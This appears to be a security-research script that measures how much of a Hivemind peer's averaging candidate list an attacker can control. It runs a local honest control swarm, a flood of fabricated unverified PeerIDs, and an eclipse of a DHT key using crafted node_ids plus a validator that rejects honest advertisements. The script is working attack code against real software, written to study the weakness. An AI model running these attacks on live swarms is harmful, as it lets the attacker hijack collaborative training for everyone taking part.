"""
Step 3, part 2a -- how much of the victim's candidate list can an attacker own?

When a Hivemind peer wants to average, it reads a DHT key to find partners. Every peer
looking for a group writes one record there (`declare_averager`,
hivemind/averaging/key_manager.py:46-67) and every peer reads the whole set back
(`get_averagers`). That set is the victim's **candidate list**: the peers it will
consider averaging with.

This measures what share of that list an attacker can hold, and what it costs. Two
mechanisms, which cost very different things:

* **Flooding.** An advertisement is an unsigned DHT record whose subkey is a PeerID
  that nobody verifies (`key_manager.py:46`, and `PeerID.__init__` does no validation
  at all). So one process can write any number of advertisements for peers that do not
  exist. Share of the list is k/(k + honest): the attacker dominates by out-writing,
  which is cheap but linear.

* **Eclipse and filter.** `step3_eclipse.py` showed five crafted node_ids own every
  replica of a key. A peer decides for itself what it will store: `record_validator` is
  a supported `DHTNode.create` argument and gates incoming writes
  (`hivemind/dht/protocol.py:248,260`). An attacker owning all the replicas and running
  a validator that rejects honest advertisements leaves them nowhere to land. Share of
  the list goes to 1.0 for a fixed five identities, whatever the swarm size.

Everything below goes through the real `GroupKeyManager`, not a reimplementation of it,
so what is measured is the code path Hivemind actually uses.

**The honest arm is the control.** It is the same swarm with no attacker, and it is what
says the measurement is of an attack rather than of the harness.

**What this does not show.** The candidate list is not the averaging group. A peer picks
one leader from this list and the group is assembled by a separate race
(`GROUP_FORMATION.md` §3), so owning the list is not yet owning the group. That is the
next experiment, and the two must not be reported as the same quantity.

Run:
    .venv/bin/python research/step3_candidates.py
    .venv/bin/python research/step3_candidates.py --num-honest 32 --floods 1 8 32 128
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import multiprocessing as mp
import random
import time
from pathlib import Path

from hivemind import DHT
from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.dht.routing import DHTID
from hivemind.dht.validation import DHTRecord, RecordValidatorBase
from hivemind.p2p import PeerID
from hivemind.utils.timed_storage import get_dht_time

RESULTS_DIR = Path(__file__).resolve().parent / "results"
LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]

PREFIX = "step2_grad_averager"
GROUP_KEY = f"{PREFIX}.0b"  # what GroupKeyManager builds with the default empty group_bits


# --------------------------------------------------------------------------
# The attacker
# --------------------------------------------------------------------------


class RejectForeignAdvertisements(RecordValidatorBase):
    """Stores only the attacker's own advertisements for one key, and drops the rest.

    Passed to a node as `record_validator`, this runs inside `rpc_store`
    (hivemind/dht/protocol.py:260) before anything is written, so an honest peer's
    advertisement is refused rather than stored and hidden later. A node that owns every
    replica of a key and runs this leaves honest advertisements with nowhere to go.

    Nothing here is a Hivemind modification: `record_validator` is a supported argument
    whose documented purpose is exactly this, deciding what a peer is willing to store.
    """

    def __init__(self, target_key: str, allowed: list[PeerID]):
        self._target = DHTID.generate(source=target_key).to_bytes()
        self._allowed = [peer_id.to_bytes() for peer_id in allowed]

    def validate(self, record: DHTRecord) -> bool:
        if record.key != self._target:
            return True  # everything else in the DHT is stored normally
        # `record.subkey` arrives serialized (protocol.py:241 passes request.subkeys
        # straight through), so match on the raw PeerID bytes inside it rather than
        # trying to reproduce the serialization.
        return any(allowed in record.subkey for allowed in self._allowed)


def fake_peer_ids(count: int, rng: random.Random) -> list[PeerID]:
    """PeerIDs for peers that do not exist.

    A real PeerID is `multihash(sha256(pubkey))` and is TLS-authenticated when you
    actually connect. As an advertisement *subkey* it is never checked against anything,
    and `PeerID.__init__` validates nothing, so these cost one DHT write each.
    """
    return [PeerID(bytes([0x00, 0x24]) + rng.randbytes(34)) for _ in range(count)]


def crafted_node_ids(target_key: str, count: int) -> list[DHTID]:
    """node_ids at XOR distance 0, 1, ... from the key's address -- see step3_eclipse.py."""
    target = DHTID.generate(source=target_key)
    return [DHTID(int(target) ^ i) for i in range(count)]


# --------------------------------------------------------------------------
# One measurement
# --------------------------------------------------------------------------


async def measure(
    honest: list[DHT],
    attacker_advertisements: list[PeerID],
    victim: DHT,
    expiration: float,
) -> dict:
    """Have every honest peer advertise, then read the list back as the victim does."""
    honest_ids = [peer.peer_id for peer in honest]

    declared_ok = 0
    for peer in honest:
        manager = GroupKeyManager(peer, prefix=PREFIX, initial_group_bits="", target_group_size=None)
        if await manager.declare_averager(GROUP_KEY, peer.peer_id, expiration_time=expiration):
            declared_ok += 1

    # The attacker writes its advertisements from wherever it already is -- these need no
    # peer behind them, so they all come from one process.
    for peer_id in attacker_advertisements:
        manager = GroupKeyManager(victim, prefix=PREFIX, initial_group_bits="", target_group_size=None)
        await manager.declare_averager(GROUP_KEY, peer_id, expiration_time=expiration)

    reader = GroupKeyManager(victim, prefix=PREFIX, initial_group_bits="", target_group_size=None)
    candidates = await reader.get_averagers(GROUP_KEY, only_active=True)

    seen = [peer_id for peer_id, _expiration in candidates]
    attacker_set = {peer_id.to_bytes() for peer_id in attacker_advertisements}
    honest_set = {peer_id.to_bytes() for peer_id in honest_ids}

    attacker_seen = sum(peer_id.to_bytes() in attacker_set for peer_id in seen)
    honest_seen = sum(peer_id.to_bytes() in honest_set for peer_id in seen)

    return dict(
        candidates=len(seen),
        attacker_in_list=attacker_seen,
        honest_in_list=honest_seen,
        honest_advertised=len(honest),
        honest_declare_ok=declared_ok,
        attacker_share=attacker_seen / len(seen) if seen else 0.0,
        honest_visible_share=honest_seen / len(honest) if honest else 0.0,
    )


# --------------------------------------------------------------------------
# The arms
# --------------------------------------------------------------------------


async def main_async(args) -> None:
    rng = random.Random(args.seed)
    rows = []

    # The flood arm is swept over write counts; the others have a single configuration.
    plan = []
    for arm in args.arms:
        for size in args.sizes:
            if arm == "flood":
                plan.extend((arm, size, count) for count in args.floods)
            else:
                plan.append((arm, size, 0))

    for arm, size, flood in plan:
        print(f"\n=== {arm}, {size} honest peers"
              + (f", {flood} advertisements" if arm == "flood" else "") + " ===")
        bootstrap = DHT(host_maddrs=LOCALHOST, start=True)
        initial_peers = bootstrap.get_visible_maddrs()

        started = time.perf_counter()
        attacker_nodes, advertisements = [], []
        if arm == "eclipse":
            # Five identities own every replica of the key (step3_eclipse.py), and each
            # refuses to store anyone else's advertisement.
            own = fake_peer_ids(1, rng)
            advertisements = own
            for node_id in crafted_node_ids(GROUP_KEY, args.replicas):
                attacker_nodes.append(
                    DHT(
                        initial_peers=initial_peers,
                        host_maddrs=LOCALHOST,
                        start=True,
                        node_id=node_id,
                        record_validators=[RejectForeignAdvertisements(GROUP_KEY, own)],
                    )
                )
        elif arm == "flood":
            advertisements = fake_peer_ids(flood, rng)
        attacker_seconds = time.perf_counter() - started

        honest = [
            DHT(initial_peers=initial_peers, host_maddrs=LOCALHOST, start=True) for _ in range(size)
        ]
        victim = DHT(initial_peers=initial_peers, host_maddrs=LOCALHOST, start=True)

        try:
            row = await measure(honest, advertisements, victim, get_dht_time() + 600)
        finally:
            for peer in honest + attacker_nodes + [victim, bootstrap]:
                try:
                    peer.shutdown()
                except Exception:
                    pass

        # alpha counts *processes*, because that is what an attacker actually pays for.
        # Fabricated advertisements have no process behind them, so a flood of any size
        # is still one machine; the eclipse arm pays for one node per replica.
        processes = len(attacker_nodes) if arm == "eclipse" else (1 if advertisements else 0)
        row.update(
            arm=arm,
            num_honest=size,
            flood=flood,
            attacker_processes=processes,
            attacker_identities=len(attacker_nodes) if arm == "eclipse" else len(advertisements),
            attacker_writes=len(advertisements),
            # honest peers + the victim + whatever the attacker really runs
            global_fraction=round(processes / (size + 1 + processes), 4),
            attacker_seconds=round(attacker_seconds, 3),
        )
        rows.append(row)
        print(f"  candidates {row['candidates']:>4}   attacker share {row['attacker_share']:.2f}   "
              f"honest visible {row['honest_in_list']}/{size}   declare_ok {row['honest_declare_ok']}/{size}")

    write_results(rows, args.tag)
    report(rows)


def write_results(rows: list, tag: str) -> None:
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    path = RESULTS_DIR / f"step3_candidates_{tag}.csv"
    with open(path, "w", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    print(f"\nwrote {path}  ({len(rows)} rows)")


def report(rows: list) -> None:
    header = (f"{'arm':<9}{'honest':>7}{'procs':>6}{'ids':>5}{'alpha':>7}"
              f"{'list':>6}{'beta_cand':>11}{'honest seen':>13}{'declared ok':>13}")
    print("\n" + header)
    print("-" * len(header))
    for row in rows:
        print(f"{row['arm']:<9}{row['num_honest']:>7}{row['attacker_processes']:>6}"
              f"{row['attacker_identities']:>5}{row['global_fraction']:>7.3f}"
              f"{row['candidates']:>6}{row['attacker_share']:>11.2f}"
              f"{row['honest_in_list']:>8}/{row['num_honest']:<4}"
              f"{row['honest_declare_ok']:>8}/{row['num_honest']:<4}")
    print("\nalpha     = attacker processes / all real processes -- what the attacker pays for")
    print("beta_cand = attacker share of the victim's candidate list")
    print("declared ok = honest peers whose own advertisement was accepted by the DHT")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    # Python 3.14 defaults to forkserver on Linux, which cannot start a Hivemind DHT --
    # see HANDOFF.md section 3, trap 2. Without this the swarm hangs instead of failing.
    mp.set_start_method("fork", force=True)

    parser.add_argument("--arms", nargs="+", default=["honest", "flood", "eclipse"])
    parser.add_argument("--sizes", type=int, nargs="+", default=[16])
    parser.add_argument("--floods", type=int, nargs="+", default=[8, 32, 128],
                        help="advertisement counts to sweep in the flood arm")
    parser.add_argument("--replicas", type=int, default=5,
                        help="attacker nodes in the eclipse arm; num_replicas defaults to 5")
    parser.add_argument("--seed", type=int, default=1234)
    parser.add_argument("--tag", type=str, default="live")
    args = parser.parse_args()
    asyncio.run(main_async(args))


if __name__ == "__main__":
    main()
